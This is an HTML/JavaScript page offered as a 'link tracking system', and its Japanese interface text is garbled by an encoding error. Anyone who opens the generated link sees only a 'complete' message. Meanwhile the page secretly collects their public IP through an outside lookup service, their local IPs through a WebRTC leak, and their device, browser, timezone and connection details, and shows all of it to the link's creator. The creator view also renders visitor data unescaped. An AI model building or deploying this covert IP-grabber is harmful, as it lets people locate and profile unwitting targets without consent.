<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>„É™„É≥„ÇØ„Éà„É©„ÉÉ„Ç≠„É≥„Ç∞„Ç∑„Çπ„ÉÜ„É†</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(ellipse at 20% 30%, rgba(220, 20, 60, 0.15) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 70%, rgba(139, 0, 0, 0.15) 0%, transparent 50%);
            animation: pulse 8s ease-in-out infinite;
            z-index: 0;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }
        
        .container {
            background: rgba(10, 0, 0, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            box-shadow: 0 0 60px rgba(255, 0, 0, 0.4);
            width: 100%;
            max-width: 900px;
            padding: 40px;
            position: relative;
            z-index: 1;
            border: 1px solid rgba(255, 0, 0, 0.3);
        }
        
        h1 {

            margin-bottom: 30px;

        }
        
        .link-section {

            padding: 30px;

        }
        
        .link-display {
            background: rgba(30, 0, 0, 0.9);
            padding: 15px;
            border-radius: 8px;
            word-break: break-all;
            font-family: 'Courier New', monospace;
            margin-bottom: 15px;
            border-left: 3px solid #dc143c;

            display: flex;
            align-items: center;
        }
        
        .btn {

            padding: 15px;
            background: linear-gradient(135deg, #8b0000, #dc143c);
            color: white;
            border: none;
            border-radius: 10px;

        }
        
        .btn:hover {
            transform: translateY(-3px);

            background: linear-gradient(135deg, #a00000, #ff1744);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        .visitors-section {
            background: rgba(20, 0, 0, 0.8);
            padding: 30px;
            border-radius: 12px;
            border: 1px solid rgba(255, 0, 0, 0.3);
        }
        
        .visitor-card {
            background: rgba(30, 0, 0, 0.9);
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 15px;
            border-left: 3px solid #dc143c;
            animation: slideIn 0.5s ease;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .visitor-card:hover {
            background: rgba(40, 0, 0, 0.95);
            transform: translateX(5px);
            border-left-color: #ff1744;
        }

        .visitor-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .expand-icon {
            font-size: 1.5rem;
            transition: transform 0.3s ease;
        }

        .visitor-card.expanded .expand-icon {
            transform: rotate(180deg);
        }

        .visitor-info {
            display: none;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin-top: 10px;
        }

        .visitor-card.expanded .visitor-info {
            display: grid;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
        
        .visitor-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin-top: 10px;
        }
        
        .info-item {
            padding: 10px;
            background: rgba(40, 0, 0, 0.8);
            border-radius: 5px;
        }
        
        .info-label {
            color: #ff8888;
            font-size: 0.85rem;
            margin-bottom: 5px;
            text-transform: uppercase;
        }
        
        .info-value {
            color: #fff;
            font-family: 'Courier New', monospace;
            word-break: break-all;
        }
        
        .completed-message {
            text-align: center;
            padding: 100px 30px;
        }
        
        .completed-message h2 {
            font-size: 3rem;
            color: #ff3333;
            text-shadow: 0 0 30px rgba(255, 0, 0, 0.8);
            animation: successPulse 2s ease-in-out infinite;
        }
        
        @keyframes successPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        #visitor-page, #link-created-section {
            display: none;
        }
        
        .timestamp {
            color: #888;
            font-size: 0.9rem;
            margin-bottom: 10px;
        }

        .start-section {
            text-align: center;
            padding: 50px 30px;
            background: rgba(20, 0, 0, 0.8);
            border-radius: 12px;
            border: 1px solid rgba(255, 0, 0, 0.3);
        }

        .start-section h2 {
            margin-bottom: 30px;
            color: #ff6666;
        }
    </style>
</head>
<body>
    <div class="container" id="creator-page">
        <h1>üîó „É™„É≥„ÇØ„Éà„É©„ÉÉ„Ç≠„É≥„Ç∞„Ç∑„Çπ„ÉÜ„É†</h1>
        
        <div class="start-section" id="start-section">
            <h2>„É™„É≥„ÇØ„Çí‰ΩúÊàê„Åó„Å¶Ë®™ÂïèËÄÖ„ÇíËøΩË∑°</h2>
            <button class="btn" onclick="createLink()">üîó Ëá™Âãï‰ΩúÊàê</button>
        </div>

        <div id="link-created-section">
            <div class="link-section">
                <h2 style="margin-bottom: 20px; color: #ff6666;">ÁîüÊàê„Åï„Çå„Åü„É™„É≥„ÇØ</h2>
                <div class="link-display" id="generated-link"></div>
                <button class="btn" onclick="copyLink()">üìã „É™„É≥„ÇØ„Çí„Ç≥„Éî„Éº</button>
            </div>
            
            <div class="visitors-section">
                <h2 style="margin-bottom: 20px; color: #ff6666;">„É™„É≥„ÇØ„ÇíÈñã„ÅÑ„Åü‰∫∫ (<span id="visitor-count">0</span>)</h2>
                <div id="visitors-list">
                    <p style="text-align: center; opacity: 0.5;">„Åæ„Å†Ë™∞„ÇÇÈñã„ÅÑ„Å¶„ÅÑ„Åæ„Åõ„Çì...</p>
                </div>
            </div>
        </div>
    </div>
    
    <div class="container" id="visitor-page">
        <div class="completed-message">
            <h2>ÂÆå‰∫ÜÔºÅ</h2>
        </div>
    </div>

    <script>
        let myLinkId = null;
        let checkInterval = null;

        const linkId = new URLSearchParams(window.location.search).get('id');
        
        if (linkId) {
            // Ë®™ÂïèËÄÖ„Éö„Éº„Ç∏
            document.getElementById('creator-page').style.display = 'none';
            document.getElementById('visitor-page').style.display = 'block';
            
            // Ë®™ÂïèËÄÖÊÉÖÂ†±„ÇíÂèéÈõÜ„Åó„Å¶‰øùÂ≠ò
            collectAndSendVisitorInfo(linkId);
        }

        async function createLink() {
            myLinkId = generateLinkId();
            const fullLink = `${window.location.origin}${window.location.pathname}?id=${myLinkId}`;
            
            document.getElementById('start-section').style.display = 'none';
            document.getElementById('link-created-section').style.display = 'block';
            document.getElementById('generated-link').textContent = fullLink;
            
            // Ë®™ÂïèËÄÖÊÉÖÂ†±„Çí„ÉÅ„Çß„ÉÉ„ÇØÈñãÂßã
            checkForVisitors(myLinkId);
        }
        
        function generateLinkId() {
            return 'link_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
        }
        
        async function collectAndSendVisitorInfo(linkId) {
            const info = {
                linkId: linkId,
                timestamp: new Date().toISOString(),
                publicIp: 'Loading...',
                localIps: [],
                userAgent: navigator.userAgent,
                browser: getBrowser(),
                os: getOS(),
                screenResolution: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                platform: navigator.platform,
                memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '‰∏çÊòé',
                connection: getConnectionInfo()
            };

            // ÈùûÂêåÊúü„ÅßIP„ÇíÂèñÂæó
            getPublicIP().then(ip => info.publicIp = ip);
            getLocalIPs().then(ips => info.localIps = ips);

            // Â∞ë„ÅóÂæÖ„Å£„Å¶„Åã„ÇâIPÊÉÖÂ†±„Å®ÂÖ±„Å´‰øùÂ≠ò
            setTimeout(async () => {
                try {
                    const stored = await window.storage.get(`visitors_${linkId}`, true);
                    let visitors = [];
                    if (stored && stored.value) {
                        try {
                            visitors = JSON.parse(stored.value);
                        } catch (e) {
                            visitors = [];
                        }
                    }
                    
                    // ÊúÄÊñ∞„ÅÆIPÊÉÖÂ†±„ÅßÊõ¥Êñ∞
                    info.publicIp = await getPublicIP();
                    info.localIps = await getLocalIPs();
                    
                    visitors.push(info);
                    await window.storage.set(`visitors_${linkId}`, JSON.stringify(visitors), true);
                    console.log('Visitor info saved:', info);
                } catch (error) {
                    console.error('Error saving visitor info:', error);
                }
            }, 3000);
        }
        
        async function checkForVisitors(linkId) {
            // Êó¢Â≠ò„ÅÆ„Ç§„É≥„Çø„Éº„Éê„É´„Çí„ÇØ„É™„Ç¢
            if (checkInterval) {
                clearInterval(checkInterval);
            }
            
            // Âç≥Â∫ß„Å´1Âõû„ÉÅ„Çß„ÉÉ„ÇØ
            await updateVisitorsList(linkId);
            
            // ÂÆöÊúüÁöÑ„Å´„ÉÅ„Çß„ÉÉ„ÇØÔºà1Áßí„Åî„Å®Ôºâ
            checkInterval = setInterval(async () => {
                await updateVisitorsList(linkId);
            }, 1000);
        }

        async function updateVisitorsList(linkId) {
            try {
                const stored = await window.storage.get(`visitors_${linkId}`, true);
                if (stored && stored.value) {
                    try {
                        const visitors = JSON.parse(stored.value);
                        if (visitors && visitors.length > 0) {
                            displayVisitors(visitors);
                        }
                    } catch (e) {
                        console.error('Error parsing visitors:', e);
                    }
                }
            } catch (error) {
                console.error('Error checking visitors:', error);
            }
        }
        
        function displayVisitors(visitors) {
            const container = document.getElementById('visitors-list');
            const countElement = document.getElementById('visitor-count');
            
            if (!visitors || visitors.length === 0) {
                container.innerHTML = '<p style="text-align: center; opacity: 0.5;">„Åæ„Å†Ë™∞„ÇÇÈñã„ÅÑ„Å¶„ÅÑ„Åæ„Åõ„Çì...</p>';
                countElement.textContent = '0';
                return;
            }

            countElement.textContent = visitors.length;
            
            container.innerHTML = '';
            visitors.forEach((visitor, index) => {
                const card = document.createElement('div');
                card.className = 'visitor-card';
                
                const timestamp = new Date(visitor.timestamp).toLocaleString('ja-JP');
                
                card.innerHTML = `
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                        <h3 style="color: #ff3333;">Ë®™ÂïèËÄÖ #${index + 1}</h3>
                        <div class="timestamp">${timestamp}</div>
                    </div>
                    <div class="visitor-info">
                        <div class="info-item">
                            <div class="info-label">„Éë„Éñ„É™„ÉÉ„ÇØIP</div>
                            <div class="info-value">${visitor.publicIp}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">„É≠„Éº„Ç´„É´IP</div>
                            <div class="info-value">${visitor.localIps && visitor.localIps.length > 0 ? visitor.localIps.join(', ') : 'ÂèñÂæó‰∏≠...'}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">„Éñ„É©„Ç¶„Ç∂</div>
                            <div class="info-value">${visitor.browser}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">OS</div>
                            <div class="info-value">${visitor.os}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Ëß£ÂÉèÂ∫¶</div>
                            <div class="info-value">${visitor.screenResolution}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Ë®ÄË™û</div>
                            <div class="info-value">${visitor.language}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">„Çø„Ç§„É†„Çæ„Éº„É≥</div>
                            <div class="info-value">${visitor.timezone}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">„Éó„É©„ÉÉ„Éà„Éï„Ç©„Éº„É†</div>
                            <div class="info-value">${visitor.platform}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">„É°„É¢„É™</div>
                            <div class="info-value">${visitor.memory}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Êé•Á∂öÊÉÖÂ†±</div>
                            <div class="info-value">${visitor.connection || '‰∏çÊòé'}</div>
                        </div>
                        <div class="info-item" style="grid-column: 1 / -1;">
                            <div class="info-label">„É¶„Éº„Ç∂„Éº„Ç®„Éº„Ç∏„Çß„É≥„Éà</div>
                            <div class="info-value" style="font-size: 0.85rem;">${visitor.userAgent}</div>
                        </div>
                    </div>
                `;
                
                container.appendChild(card);
            });
        }
        
        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return "ÂèñÂæóÂ§±Êïó";
            }
        }
        
        async function getLocalIPs() {
            return new Promise(resolve => {
                const ips = new Set();
                const pc = new RTCPeerConnection({ iceServers: [] });
                
                pc.createDataChannel("");
                pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
                
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    
                    const parts = ice.candidate.candidate.split(' ');
                    const ip = parts[4];
                    
                    if (ip && !ips.has(ip) && !ip.startsWith("127.") && !ip.startsWith("0.")) {
                        ips.add(ip);
                    }
                    
                    if (pc.iceGatheringState === "complete") {
                        pc.close();
                        resolve(Array.from(ips));
                    }
                };
                
                setTimeout(() => {
                    pc.close();
                    resolve(Array.from(ips));
                }, 3000);
            });
        }
        
        function getOS() {
            const userAgent = navigator.userAgent;
            if (/Windows/.test(userAgent)) return "Windows";
            if (/Macintosh/.test(userAgent)) return "Mac OS";
            if (/Linux/.test(userAgent)) return "Linux";
            if (/Android/.test(userAgent)) return "Android";
            if (/iOS|iPhone|iPad|iPod/.test(userAgent)) return "iOS";
            return "Unknown OS";
        }
        
        function getBrowser() {
            const userAgent = navigator.userAgent;
            if (/Edg/.test(userAgent)) return "Microsoft Edge";
            if (/Chrome/.test(userAgent)) return "Google Chrome";
            if (/Firefox/.test(userAgent)) return "Mozilla Firefox";
            if (/Safari/.test(userAgent)) return "Safari";
            if (/Opera|OPR/.test(userAgent)) return "Opera";
            return "Unknown Browser";
        }
        
        function getConnectionInfo() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return "‰∏çÊòé";
            return `${conn.effectiveType || '‰∏çÊòé'} (${conn.type || '‰∏çÊòé'})`;
        }
        
        function copyLink() {
            const link = document.getElementById('generated-link').textContent;
            navigator.clipboard.writeText(link).then(() => {
                const btn = event.target;
                const originalText = btn.textContent;
                btn.textContent = '‚úÖ „Ç≥„Éî„Éº„Åó„Åæ„Åó„ÅüÔºÅ';
                btn.style.background = 'linear-gradient(135deg, #006400, #228B22)';
                setTimeout(() => {
                    btn.textContent = originalText;
                    btn.style.background = '';
                }, 2000);
            });
        }
    </script>
</body>
